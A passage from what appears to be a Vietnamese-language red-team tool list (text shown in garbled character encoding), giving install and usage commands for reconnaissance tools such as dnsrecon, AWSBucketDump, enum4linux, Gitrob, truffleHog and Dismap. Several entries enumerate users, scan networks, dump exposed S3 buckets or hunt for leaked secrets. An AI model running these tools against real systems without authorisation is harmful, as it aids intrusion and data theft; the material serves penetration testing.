**LÆ°u Ã½:** ÄÃ¢y lÃ  cÃ¡c vÃ­ dá»¥ vá» cÃ¡ch cháº¡y tá»‡p nhá»‹ phÃ¢n **CloudBrute** vá»›i cÃ¡c tham sá»‘ dÃ²ng lá»‡nh khÃ¡c nhau. `-d` chá»‰ Ä‘á»‹nh tÃªn miá»n, `-k` tá»« khÃ³a, `-m` cháº¿ Ä‘á»™ (vÃ­ dá»¥: storage), `-t` sá»‘ luá»“ng, `-T` timeout, `-w` wordlist, `-c` cloud provider cá»¥ thá»ƒ, `-o` tá»‡p Ä‘áº§u ra.

![image](https://user-images.githubusercontent.com/100603074/216729172-5d58d005-85a8-49f2-8968-98b459961f81.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/0xsha/CloudBrute*

### [ğŸ”™](#tool-list)[**dnsrecon**](https://www.kali.org/tools/dnsrecon/#dnsrecon)

**dnsrecon** lÃ  má»™t cÃ´ng cá»¥ **python** Ä‘á»ƒ liá»‡t kÃª cÃ¡c báº£n ghi **DNS** (**MX, SOA, NS, A, AAAA, SPF** vÃ  **TXT**) vÃ  cÃ³ thá»ƒ cung cáº¥p má»™t sá»‘ mÃ¡y chá»§ má»¥c tiÃªu má»›i liÃªn quan Ä‘á»ƒ chuyá»ƒn hÆ°á»›ng sang tá»« má»™t láº§n tÃ¬m kiáº¿m tÃªn miá»n duy nháº¥t.

**CÃ i Ä‘áº·t:**

```bash
sudo apt install dnsrecon
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n trÃªn **Linux/Debian/Ubuntu** sá»­ dá»¥ng **apt**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
dnsrecon -d google.com
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cháº¡y `dnsrecon` Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c kiá»ƒm tra liá»‡t kÃª DNS tiÃªu chuáº©n cho tÃªn miá»n Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh (`google.com`).

![image](https://user-images.githubusercontent.com/100603074/191689049-624db340-8adb-4a97-be8d-b7177f409a8b.png)

### [ğŸ”™](#tool-list)[**shodan.io**](https://www.shodan.io/dashboard)

**Shodan** thu tháº­p thÃ´ng tin vá» háº¡ táº§ng cÃ´ng khai vÃ  hiá»ƒn thá»‹ chÃºng á»Ÿ Ä‘á»‹nh dáº¡ng cÃ³ thá»ƒ tÃ¬m kiáº¿m. Sá»­ dá»¥ng tÃªn cÃ´ng ty, tÃªn miá»n, Ä‘á»‹a chá»‰ IP, cÃ³ thá»ƒ phÃ¡t hiá»‡n cÃ¡c há»‡ thá»‘ng cÃ³ kháº£ nÄƒng dá»… bá»‹ táº¥n cÃ´ng liÃªn quan Ä‘áº¿n má»¥c tiÃªu cá»§a báº¡n thÃ´ng qua **shodan**.

![image](https://user-images.githubusercontent.com/100603074/191689282-70f99fe9-aa08-4cd3-b881-764eface8546.png)

### [ğŸ”™](#tool-list)[**AORT**](https://github.com/D3Ext/AORT)

CÃ´ng cá»¥ Ä‘á»ƒ liá»‡t kÃª tÃªn miá»n phá»¥, liá»‡t kÃª **DNS**, phÃ¡t hiá»‡n **WAF**, **WHOIS**, quÃ©t cá»•ng (**port scan**), **wayback machine**, thu tháº­p email (**email harvesting**).

**CÃ i Ä‘áº·t:**

```bash
git clone https://github.com/D3Ext/AORT; cd AORT; pip3 install -r requirements.txt
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t tiÃªu chuáº©n cho **Linux/macOS** hoáº·c há»‡ thá»‘ng cÃ³ **Git** vÃ  **Python** Ä‘á»ƒ táº£i xuá»‘ng mÃ£ nguá»“n vÃ  cÃ i Ä‘áº·t cÃ¡c thÆ° viá»‡n Python cáº§n thiáº¿t.

**CÃ¡ch sá»­ dá»¥ng:**

```python
python3 AORT.py -d google.com
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cháº¡y script **AORT.py** vá»›i cá» `-d` Ä‘á»ƒ chá»‰ Ä‘á»‹nh tÃªn miá»n má»¥c tiÃªu, kÃ­ch hoáº¡t cÃ¡c module **recon** khÃ¡c nhau Ä‘Æ°á»£c tÃ­ch há»£p sáºµn trong cÃ´ng cá»¥.

![image](https://user-images.githubusercontent.com/100603074/192070398-aae0217d-69c4-460b-ae4c-51b045551268.png)

### [ğŸ”™](#tool-list)[**spoofcheck**](https://github.com/BishopFox/spoofcheck)

Má»™t chÆ°Æ¡ng trÃ¬nh kiá»ƒm tra xem má»™t tÃªn miá»n cÃ³ thá»ƒ bá»‹ giáº£ máº¡o nguá»“n gá»­i hay khÃ´ng. ChÆ°Æ¡ng trÃ¬nh kiá»ƒm tra cÃ¡c báº£n ghi **SPF** vÃ  **DMARC** Ä‘á»ƒ tÃ¬m cÃ¡c cáº¥u hÃ¬nh yáº¿u cho phÃ©p giáº£ máº¡o. NgoÃ i ra, nÃ³ sáº½ cáº£nh bÃ¡o náº¿u tÃªn miá»n cÃ³ cáº¥u hÃ¬nh **DMARC** gá»­i mail hoáº·c yÃªu cáº§u HTTP khi cÃ¡c email **SPF/DKIM** tháº¥t báº¡i.

CÃ¡c tÃªn miá»n cÃ³ thá»ƒ bá»‹ giáº£ máº¡o náº¿u báº¥t ká»³ Ä‘iá»u kiá»‡n nÃ o sau Ä‘Ã¢y Ä‘Æ°á»£c Ä‘Ã¡p á»©ng:

- Thiáº¿u báº£n ghi **SPF** hoáº·c **DMARC**
- Báº£n ghi **SPF** khÃ´ng bao giá» chá»‰ Ä‘á»‹nh `~all` hoáº·c `-all`
- ChÃ­nh sÃ¡ch **DMARC** Ä‘Æ°á»£c Ä‘áº·t lÃ  `p=none` hoáº·c khÃ´ng tá»“n táº¡i

**CÃ i Ä‘áº·t:**

```bash
git clone https://github.com/BishopFox/spoofcheck; cd spoofcheck; pip install -r requirements.txt
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t tiÃªu chuáº©n cho **Linux/macOS** hoáº·c há»‡ thá»‘ng cÃ³ **Git** vÃ  **Python**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
./spoofcheck.py [DOMAIN]
```
**LÆ°u Ã½:** Cháº¡y **script spoofcheck.py** vá»›i tÃªn miá»n cáº§n kiá»ƒm tra lÃ m Ä‘á»‘i sá»‘.

![image](https://user-images.githubusercontent.com/100603074/208209744-dfff6dd6-f53c-41a2-b3b7-bfc6bfb9b521.png)

### [ğŸ”™](#tool-list)[**AWSBucketDump**](https://github.com/jordanpotti/AWSBucketDump)

**AWSBucketDump** lÃ  má»™t cÃ´ng cá»¥ Ä‘á»ƒ nhanh chÃ³ng liá»‡t kÃª cÃ¡c **S3 bucket** cá»§a **AWS** nháº±m tÃ¬m kiáº¿m cÃ¡c tá»‡p Ä‘Ã¡ng chÃº Ã½. NÃ³ tÆ°Æ¡ng tá»± nhÆ° má»™t cÃ´ng cá»¥ **brute force** tÃªn miá»n phá»¥ nhÆ°ng Ä‘Æ°á»£c táº¡o ra Ä‘áº·c biá»‡t cho **S3 bucket** vÃ  cÃ²n cÃ³ thÃªm má»™t sá»‘ tÃ­nh nÄƒng cho phÃ©p báº¡n **grep** cÃ¡c tá»‡p, cÅ©ng nhÆ° táº£i xuá»‘ng cÃ¡c tá»‡p Ä‘Ã¡ng chÃº Ã½.

**CÃ i Ä‘áº·t:**

```
git clone https://github.com/jordanpotti/AWSBucketDump; cd AWSBucketDump; pip install -r requirements.txt
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh cÃ i Ä‘áº·t tiÃªu chuáº©n cho **Linux/macOS** hoáº·c há»‡ thá»‘ng cÃ³ **Git** vÃ  **Python**.

**CÃ¡ch sá»­ dá»¥ng:**

```
usage: AWSBucketDump.py [-h] [-D] [-t THREADS] -l HOSTLIST [-g GREPWORDS] [-m MAXSIZE]

optional arguments:
  -h, --help    show this help message and exit
  -D            Download files. This requires significant diskspace
  -d            If set to 1 or True, create directories for each host w/ results
  -t THREADS    number of threads
  -l HOSTLIST
  -g GREPWORDS  Provide a wordlist to grep for
  -m MAXSIZE    Maximum file size to download.

 python AWSBucketDump.py -l BucketNames.txt -g interesting_Keywords.txt -D -m 500000 -d 1
```
**LÆ°u Ã½:** **Output help** cá»§a **script Python AWSBucketDump.py** cÃ¹ng vá»›i vÃ­ dá»¥ sá»­ dá»¥ng cÆ¡ báº£n.

### [ğŸ”™](#tool-list)[**GitHarvester**](https://metac0rtex.me/)

CÃ´ng cá»¥ hay Ä‘á»ƒ tÃ¬m kiáº¿m thÃ´ng tin tá»« **GitHub** báº±ng **regex**, vá»›i kháº£ nÄƒng tÃ¬m kiáº¿m ngÆ°á»i dÃ¹ng vÃ /hoáº·c dá»± Ã¡n **GitHub** cá»¥ thá»ƒ.

**CÃ i Ä‘áº·t:**

```
git clone https://github.com/metac0rtex/GitHarvester; cd GitHarvester
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n báº±ng **Git** trÃªn **Linux/macOS**.

**CÃ¡ch sá»­ dá»¥ng:**

```
./githarvester.py
```
**LÆ°u Ã½:** Lá»‡nh thá»±c thi **script Python GitHarvester**. CÃ´ng cá»¥ thÆ°á»ng hoáº¡t Ä‘á»™ng á»Ÿ cháº¿ Ä‘á»™ tÆ°Æ¡ng tÃ¡c hoáº·c cháº¥p nháº­n tham sá»‘.

### [ğŸ”™](#tool-list)[**truffleHog**](https://github.com/dxa4481/truffleHog)

**TruffleHog** lÃ  má»™t cÃ´ng cá»¥ quÃ©t cÃ¡c **git repository** vÃ  tÃ¬m kiáº¿m cÃ¡c chuá»—i cÃ³ **entropy** cao vÃ  cÃ¡c máº«u cÃ³ thá»ƒ cho tháº¥y sá»± hiá»‡n diá»‡n cá»§a bÃ­ máº­t, cháº³ng háº¡n nhÆ° máº­t kháº©u vÃ  khÃ³a **API**. Vá»›i **TruffleHog**, báº¡n cÃ³ thá»ƒ nhanh chÃ³ng vÃ  dá»… dÃ ng tÃ¬m tháº¥y thÃ´ng tin nháº¡y cáº£m cÃ³ thá»ƒ Ä‘Ã£ vÃ´ tÃ¬nh Ä‘Æ°á»£c **commit** vÃ  **push** lÃªn má»™t **repository**.

**CÃ i Ä‘áº·t (Binaries):** [LiÃªn káº¿t](https://github.com/trufflesecurity/trufflehog/releases)
**LÆ°u Ã½:** CÃ¡ch Ä‘Æ¡n giáº£n nháº¥t lÃ  táº£i tá»‡p thá»±c thi trá»±c tiáº¿p.

**CÃ i Ä‘áº·t (Go):**

```
git clone https://github.com/trufflesecurity/trufflehog.git; cd trufflehog; go install
```
**LÆ°u Ã½:** CÃ¡ch cÃ i Ä‘áº·t cho ngÆ°á»i dÃ¹ng Ä‘Ã£ cÃ³ mÃ´i trÆ°á»ng **Go** vÃ  **Git**. **`go install`** sáº½ build vÃ  cÃ i Ä‘áº·t cÃ´ng cá»¥ vÃ o thÆ° má»¥c **bin** cá»§a **Go** workspace.

**CÃ¡ch sá»­ dá»¥ng:**

```
trufflehog https://github.com/trufflesecurity/test_keys
```
**LÆ°u Ã½:** VÃ­ dá»¥ cháº¡y **trufflehog** trá»±c tiáº¿p Ä‘á»ƒ quÃ©t má»™t **repository GitHub** cá»¥ thá»ƒ.

![image](https://user-images.githubusercontent.com/100603074/208212273-137cb6ef-b0e6-42f7-8fd3-ac6a5cfe6a40.png)

### [ğŸ”™](#tool-list)[**Dismap**](https://github.com/zhzyker/dismap)

**Dismap** lÃ  má»™t cÃ´ng cá»¥ khÃ¡m phÃ¡ vÃ  nháº­n dáº¡ng tÃ i sáº£n. NÃ³ cÃ³ thá»ƒ nhanh chÃ³ng nháº­n dáº¡ng giao thá»©c vÃ  thÃ´ng tin vÃ¢n tay ká»¹ thuáº­t (**fingerprint**) nhÆ° web/tcp/udp, Ä‘á»‹nh vá»‹ loáº¡i tÃ i sáº£n vÃ  phÃ¹ há»£p cho máº¡ng ná»™i bá»™ vÃ  máº¡ng bÃªn ngoÃ i.

**Dismap** cÃ³ má»™t cÆ¡ sá»Ÿ dá»¯ liá»‡u quy táº¯c **fingerprint** Ä‘áº§y Ä‘á»§, hiá»‡n bao gá»“m **fingerprint** giao thá»©c **tcp/udp/tls** vÃ  hÆ¡n **4500** quy táº¯c **web fingerprint**, cÃ³ thá»ƒ nháº­n dáº¡ng **favicon**, **body**, **header**, v.v.

**CÃ i Ä‘áº·t:**

**Dismap** lÃ  má»™t tá»‡p nhá»‹ phÃ¢n cho **Linux**, **MacOS** vÃ  **Windows**. Truy cáº­p [Release](https://github.com/zhzyker/dismap/releases) Ä‘á»ƒ táº£i phiÃªn báº£n tÆ°Æ¡ng á»©ng vÃ  cháº¡y:

```bash
# Linux or MacOS
chmod +x dismap-0.3-linux-amd64
./dismap-0.3-linux-amd64 -h

# Windows
dismap-0.3-windows-amd64.exe -h
```
**LÆ°u Ã½:** HÆ°á»›ng dáº«n cáº¥p quyá»n thá»±c thi cho file binary trÃªn **Linux/macOS** vÃ  hiá»ƒn thá»‹ mÃ n hÃ¬nh trá»£ giÃºp cho cáº£ hai ná»n táº£ng.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# QuÃ©t máº¡ng con 192.168.1.1
./dismap -i 192.168.1.1/24

# QuÃ©t, xuáº¥t káº¿t quáº£ ra result.txt vÃ  xuáº¥t json ra result.json
./dismap -i 192.168.1.1/24 -o result.txt -j result.json

# QuÃ©t, khÃ´ng sá»­ dá»¥ng ICMP/PING Ä‘á»ƒ phÃ¡t hiá»‡n mÃ¡y chá»§ Ä‘ang hoáº¡t Ä‘á»™ng, timeout 10 giÃ¢y
./dismap -i 192.168.1.1/24 --np --timeout 10

# QuÃ©t, sá»‘ luá»“ng Ä‘á»“ng thá»i 1000
./dismap -i 192.168.1.1/24 -t 1000
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ vá» cÃ¡ch sá»­ dá»¥ng **Dismap** vá»›i cÃ¡c tÃ¹y chá»n phá»• biáº¿n Ä‘á»ƒ quÃ©t má»™t dáº£i IP (`-i`), lÆ°u káº¿t quáº£ ra tá»‡p (`-o`, `-j`), bá» qua kiá»ƒm tra ping (`--np`) vÃ  Ä‘iá»u chá»‰nh sá»‘ luá»“ng (`-t`).

![image](https://user-images.githubusercontent.com/100603074/210266012-ba3fadf8-5021-4690-a6d7-eda78bd5d50a.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/zhzyker/dismap*

### [ğŸ”™](#tool-list)[**enum4linux**](https://github.com/CiscoCXSecurity/enum4linux)

Má»™t cÃ´ng cá»¥ Ä‘á»ƒ liá»‡t kÃª thÃ´ng tin tá»« cÃ¡c há»‡ thá»‘ng **Windows** vÃ  **Samba**.

NÃ³ cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ thu tháº­p nhiá»u loáº¡i thÃ´ng tin, bao gá»“m:

- ThÃ´ng tin vá» **Domain** vÃ  **Domain Controller**
- ThÃ´ng tin ngÆ°á»i dÃ¹ng vÃ  nhÃ³m cá»¥c bá»™
- Chia sáº» (**Shares**) vÃ  quyá»n chia sáº» (**share permissions**)
- ChÃ­nh sÃ¡ch báº£o máº­t (**Security policies**)
- ThÃ´ng tin **Active Directory**

**CÃ i Ä‘áº·t: (Apt)**

```bash
sudo apt install enum4linux
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tiÃªu chuáº©n trÃªn **Linux/Debian/Ubuntu** sá»­ dá»¥ng **apt**.

**CÃ i Ä‘áº·t: (Git)**

```bash
git clone https://github.com/CiscoCXSecurity/enum4linux
cd enum4linux
```
**LÆ°u Ã½:** CÃ i Ä‘áº·t tá»« mÃ£ nguá»“n báº±ng **Git**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# 'Thá»±c hiá»‡n má»i thá»©'
enum4linux.pl -a 192.168.2.55

# Láº¥y danh sÃ¡ch tÃªn ngÆ°á»i dÃ¹ng (RestrictAnonymous = 0)
enum4linux.pl -U 192.168.2.55

# Láº¥y danh sÃ¡ch tÃªn ngÆ°á»i dÃ¹ng (sá»­ dá»¥ng xÃ¡c thá»±c)
enum4linux.pl -u administrator -p password -U 192.168.2.55

# Get a list of groups and their members
enum4linux.pl -G 192.168.2.55

# QuÃ©t chi tiáº¿t (Verbose scan)
enum4linux.pl -v 192.168.2.55
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  cÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **script perl enum4linux.pl** vá»›i cÃ¡c cá» phá»• biáº¿n. `-a` cho phÃ©p cháº¡y táº¥t cáº£ cÃ¡c kiá»ƒm tra, `-U` Ä‘á»ƒ liá»‡t kÃª ngÆ°á»i dÃ¹ng, `-u` vÃ  `-p` Ä‘á»ƒ cung cáº¥p thÃ´ng tin xÃ¡c thá»±c, `-G` Ä‘á»ƒ liá»‡t kÃª nhÃ³m vÃ  thÃ nh viÃªn, `-v` Ä‘á»ƒ hiá»ƒn thá»‹ chi tiáº¿t hÆ¡n. CÃ´ng cá»¥ cháº¡y trÃªn **Linux** nháº¯m vÃ o há»‡ thá»‘ng **Windows/Samba** tá»« xa.

ThÃ´ng tin sá»­ dá»¥ng Ä‘áº§y Ä‘á»§ cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ¬m tháº¥y trong [bÃ i Ä‘Äƒng trÃªn blog](https://labs.portcullis.co.uk/tools/enum4linux/) nÃ y.

![image](https://user-images.githubusercontent.com/100603074/210266058-bf05f272-ff05-4e97-97e9-5d11b7ae01eb.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://allabouttesting.org/samba-enumeration-for-penetration-testing-short-tutorial/*

### [ğŸ”™](#tool-list)[**skanuvaty**](https://github.com/Esc4iCEscEsc/skanuvaty)

CÃ´ng cá»¥ quÃ©t **dns/network/port** cá»±c nhanh vÃ  nguy hiá»ƒm, Ä‘Æ°á»£c táº¡o bá»Ÿi [Esc4iCEscEsc](https://github.com/Esc4iCEscEsc), viáº¿t báº±ng **rust**.

Báº¡n sáº½ cáº§n má»™t tá»‡p tÃªn miá»n phá»¥ (**subdomains file**). *VÃ­ dá»¥: [Wordlist tÃªn miá»n phá»¥ cá»§a Sublist3r](https://raw.githubusercontent.com/aboul3la/Sublist3r/master/subbrute/names.txt)*.

**CÃ i Ä‘áº·t:**

Táº£i xuá»‘ng phiÃªn báº£n má»›i nháº¥t tá»« [táº¡i Ä‘Ã¢y](https://github.com/Esc4iCEscEsc/skanuvaty/releases).
**LÆ°u Ã½:** PhÆ°Æ¡ng phÃ¡p Ä‘Æ¡n giáº£n nháº¥t lÃ  táº£i file binary phÃ¹ há»£p vá»›i há»‡ Ä‘iá»u hÃ nh.

```bash
# CÃ i Ä‘áº·t má»™t wordlist
sudo apt install wordlists
ls /usr/share/dirb/wordlists
ls /usr/share/amass/wordlists
```
**LÆ°u Ã½:** CÃ¡c lá»‡nh nÃ y cÃ i Ä‘áº·t vÃ  liá»‡t kÃª ná»™i dung cÃ¡c thÆ° má»¥c **wordlist** phá»• biáº¿n trÃªn cÃ¡c há»‡ thá»‘ng **Linux** dá»±a trÃªn **Debian/Ubuntu**.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
skanuvaty --target example.com --concurrency 16 --subdomains-file SUBDOMAIN_WORDLIST.txt
```
**LÆ°u Ã½:** Lá»‡nh nÃ y cháº¡y tá»‡p nhá»‹ phÃ¢n `skanuvaty`. `--target` chá»‰ Ä‘á»‹nh tÃªn miá»n má»¥c tiÃªu. `--concurrency` Ä‘áº·t sá»‘ luá»“ng Ä‘á»“ng thá»i Ä‘á»ƒ quÃ©t nhanh hÆ¡n. `--subdomains-file` chá»‰ Ä‘á»‹nh tá»‡p chá»©a danh sÃ¡ch tÃªn miá»n phá»¥ Ä‘á»ƒ kiá»ƒm tra.

![image](https://user-images.githubusercontent.com/100603074/210856146-42a4015c-f34b-4dc6-9e9b-cbeb4a43a964.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/Esc4iCEscEsc/skanuvaty*

### [ğŸ”™](#tool-list)[**Metabigor**](https://github.com/j3ssie/metabigor)

**Metabigor** lÃ  cÃ´ng cá»¥ ThÃ´ng tin TÃ¬nh bÃ¡o (**Intelligence tool**), má»¥c tiÃªu cá»§a nÃ³ lÃ  thá»±c hiá»‡n cÃ¡c tÃ¡c vá»¥ **OSINT** vÃ  nhiá»u hÆ¡n ná»¯a nhÆ°ng khÃ´ng cáº§n báº¥t ká»³ khÃ³a **API** nÃ o.

**CÃ¡c tÃ­nh nÄƒng chÃ­nh:**

- TÃ¬m kiáº¿m thÃ´ng tin vá» **Äá»‹a chá»‰ IP, ASN** vÃ  Tá»• chá»©c.
- Wrapper Ä‘á»ƒ cháº¡y **rustscan, masscan** vÃ  **nmap** hiá»‡u quáº£ hÆ¡n trÃªn **IP/CIDR**.
- TÃ¬m kiáº¿m nhiá»u tÃªn miá»n liÃªn quan cá»§a má»¥c tiÃªu báº±ng cÃ¡ch Ã¡p dá»¥ng cÃ¡c ká»¹ thuáº­t khÃ¡c nhau (chá»©ng chá»‰, whois, **Google Analytics**, etc).
- Get Summary about IP address (powered by [@thebl4ckturtle](https://github.com/theblackturtle))

**CÃ i Ä‘áº·t:**

```bash
go install github.com/j3ssie/metabigor@latest
```
**LÆ°u Ã½:** YÃªu cáº§u cÃ i Ä‘áº·t **Go** vÃ  cáº¥u hÃ¬nh Ä‘Ãºng path. Táº£i xuá»‘ng vÃ  cÃ i Ä‘áº·t vÃ o thÆ° má»¥c bin cá»§a Go workspace.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# discovery IP of a company/organization
echo "company" | metabigor net --org -o /tmp/result.txt

# Getting more related domains by searching for certificate info
echo 'Target Inc' | metabigor cert --json | jq -r '.Domain' | unfurl format %r.%t | sort -u # this is old command

# Only run rustscan with full ports
echo '1.2.3.4/24' | metabigor scan -o result.txt

# Reverse Whois to find related domains
echo 'example.com' | metabigor related -s 'whois'

# Get Google Analytics ID directly from the URL
echo 'https://example.com' | metabigor related -s 'google-analytic'
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ vá» cÃ¡ch sá»­ dá»¥ng `metabigor` vá»›i cÃ¡c subcommand khÃ¡c nhau (`net`, `cert`, `scan`, `related`) Ä‘á»ƒ thá»±c hiá»‡n cÃ¡c tÃ¡c vá»¥ OSINT khÃ¡c nhau. Sá»­ dá»¥ng cÃº phÃ¡p piping (`|`) phá»• biáº¿n trÃªn **Linux/macOS** Ä‘á»ƒ truyá»n káº¿t quáº£ tá»« lá»‡nh nÃ y sang lá»‡nh khÃ¡c. YÃªu cáº§u cÃ¡c cÃ´ng cá»¥ nhÆ° `jq` vÃ  `unfurl` (cho vÃ­ dá»¥ `cert`) cÅ©ng Ä‘Æ°á»£c cÃ i Ä‘áº·t.

![image](https://user-images.githubusercontent.com/100603074/210982590-44d58bfc-3b1b-4e11-b8f3-58c5a517626d.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/j3ssie/metabigor*

### [ğŸ”™](#tool-list)[**Gitrob**](https://github.com/michenriksen/gitrob)

**Gitrob** lÃ  má»™t cÃ´ng cá»¥ giÃºp tÃ¬m kiáº¿m cÃ¡c tá»‡p cÃ³ kháº£ nÄƒng nháº¡y cáº£m Ä‘Æ°á»£c Ä‘áº©y lÃªn cÃ¡c **repository** cÃ´ng khai trÃªn **Github**.

**Gitrob** sáº½ nhÃ¢n báº£n cÃ¡c **repository** thuá»™c vá» má»™t ngÆ°á»i dÃ¹ng hoáº·c tá»• chá»©c Ä‘áº¿n Ä‘á»™ sÃ¢u cÃ³ thá»ƒ cáº¥u hÃ¬nh vÃ  láº·p qua lá»‹ch sá»­ commit vÃ  Ä‘Ã¡nh dáº¥u cÃ¡c tá»‡p khá»›p vá»›i chá»¯ kÃ½ cho cÃ¡c tá»‡p cÃ³ kháº£ nÄƒng nháº¡y cáº£m.

CÃ¡c káº¿t quáº£ sáº½ Ä‘Æ°á»£c trÃ¬nh bÃ y thÃ´ng qua giao diá»‡n web Ä‘á»ƒ duyá»‡t vÃ  phÃ¢n tÃ­ch dá»… dÃ ng.

**LÆ°u Ã½:** *Gitrob sáº½ cáº§n má»™t **token truy cáº­p Github** Ä‘á»ƒ tÆ°Æ¡ng tÃ¡c vá»›i **Github API**. [Táº¡o má»™t **token truy cáº­p cÃ¡ nhÃ¢n**](https://help.github.com/articles/creating-a-personal-access-token-for-the-command-line/) vÃ  lÆ°u nÃ³ vÃ o biáº¿n mÃ´i trÆ°á»ng trong tá»‡p `.bashrc` cá»§a báº¡n hoáº·c tá»‡p cáº¥u hÃ¬nh shell tÆ°Æ¡ng tá»±:*

```bash
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
```
**LÆ°u Ã½:** ÄÃ¢y lÃ  cÃº phÃ¡p Ä‘áº·t biáº¿n mÃ´i trÆ°á»ng trong bash (phá»• biáº¿n trÃªn **Linux/macOS**). Token truy cáº­p cÃ¡ nhÃ¢n Ä‘Æ°á»£c lÆ°u trá»¯ nháº¡y cáº£m vÃ  khÃ´ng nÃªn Ä‘Æ°á»£c chia sáº» cÃ´ng khai.

**CÃ i Ä‘áº·t: (Go)**

```bash
go get github.com/michenriksen/gitrob
```
**LÆ°u Ã½:** YÃªu cáº§u cÃ i Ä‘áº·t **Go** vÃ  cáº¥u hÃ¬nh Ä‘Ãºng path. Táº£i xuá»‘ng vÃ  cÃ i Ä‘áº·t vÃ o thÆ° má»¥c bin cá»§a Go workspace.

**CÃ i Ä‘áº·t: (Binary)**

Má»™t [phiÃªn báº£n biÃªn dá»‹ch sáºµn](https://github.com/michenriksen/gitrob/releases) cÃ³ sáºµn cho má»—i báº£n phÃ¡t hÃ nh.

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Run against org
gitrob {org_name}

# Saving session to a file
gitrob -save ~/gitrob-session.json acmecorp

# Loading session from a file
gitrob -load ~/gitrob-session.json
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ sá»­ dá»¥ng **cÃ´ng cá»¥ gitrob**. `{org_name}` Ä‘Æ°á»£c thay tháº¿ báº±ng tÃªn tá»• chá»©c GitHub má»¥c tiÃªu. `-save` vÃ  `-load` Ä‘Æ°á»£c dÃ¹ng Ä‘á»ƒ lÆ°u/táº£i tráº¡ng thÃ¡i phiÃªn quÃ©t.

![image](https://user-images.githubusercontent.com/100603074/210982754-fb70db8f-0e0f-4c31-962f-ac89edc7e6a4.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://www.uedbox.com/post/58828/*

### [ğŸ”™](#tool-list)[**gowitness**](https://github.com/sensepost/gowitness)

**Gowitness** lÃ  tiá»‡n Ã­ch chá»¥p áº£nh mÃ n hÃ¬nh trang web Ä‘Æ°á»£c viáº¿t báº±ng **Golang**, sá»­ dá»¥ng **Chrome Headless** Ä‘á»ƒ táº¡o áº£nh chá»¥p mÃ n hÃ¬nh cÃ¡c giao diá»‡n web báº±ng dÃ²ng lá»‡nh, vá»›i trÃ¬nh xem bÃ¡o cÃ¡o tiá»‡n lá»£i Ä‘á»ƒ xá»­ lÃ½ káº¿t quáº£. Cáº£ **Linux** vÃ  **macOS** Ä‘á»u Ä‘Æ°á»£c há»— trá»£, trong khi há»— trá»£ **Windows** hoáº¡t Ä‘á»™ng chá»§ yáº¿u.

**CÃ i Ä‘áº·t: (Go)**

```bash
go install github.com/sensepost/gowitness@latest
```
**LÆ°u Ã½:** YÃªu cáº§u cÃ i Ä‘áº·t **Go** vÃ  cáº¥u hÃ¬nh Ä‘Ãºng path.

ThÃ´ng tin cÃ i Ä‘áº·t Ä‘áº§y Ä‘á»§ cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ¬m tháº¥y [táº¡i Ä‘Ã¢y](https://github.com/sensepost/gowitness/wiki/Installation).

**CÃ¡ch sá»­ dá»¥ng:**

```bash
# Screenshot má»™t trang web duy nháº¥t
gowitness single https://www.google.com/

# Screenshot má»™t cidr báº±ng 20 luá»“ng
gowitness scan --cidr 192.168.0.0/24 --threads 20

# Screenshot cÃ¡c dá»‹ch vá»¥ http Ä‘ang má»Ÿ tá»« má»™t tá»‡p namp
gowitness nmap -f nmap.xml --open --service-contains http

# Cháº¡y server bÃ¡o cÃ¡o
gowitness report serve
```
**LÆ°u Ã½:** CÃ¡c vÃ­ dá»¥ vá» cÃ¡c subcommand chÃ­nh cá»§a **gowitness**. `single` chá»¥p má»™t URL duy nháº¥t. `scan` chá»¥p áº£nh mÃ n hÃ¬nh cÃ¡c Ä‘á»‹a chá»‰ trong má»™t dáº£i CIDR. `nmap` tÃ­ch há»£p vá»›i káº¿t quáº£ quÃ©t cá»§a **nmap** Ä‘á»ƒ chá»¥p áº£nh mÃ n hÃ¬nh cÃ¡c dá»‹ch vá»¥ web Ä‘Æ°á»£c phÃ¡t hiá»‡n. `report serve` khá»Ÿi Ä‘á»™ng má»™t web server Ä‘á»ƒ xem cÃ¡c áº£nh chá»¥p mÃ n hÃ¬nh Ä‘Ã£ thu tháº­p.

ThÃ´ng tin sá»­ dá»¥ng Ä‘áº§y Ä‘á»§ cÃ³ thá»ƒ Ä‘Æ°á»£c tÃ¬m tháº¥y [táº¡i Ä‘Ã¢y](https://github.com/sensepost/gowitness/wiki/Usage).

![image](https://user-images.githubusercontent.com/100603074/212204666-d7dcac1b-0f1a-46b8-8938-d2e122c1436c.png)

*HÃ¬nh áº£nh Ä‘Æ°á»£c sá»­ dá»¥ng tá»« https://github.com/sensepost/gowitness*

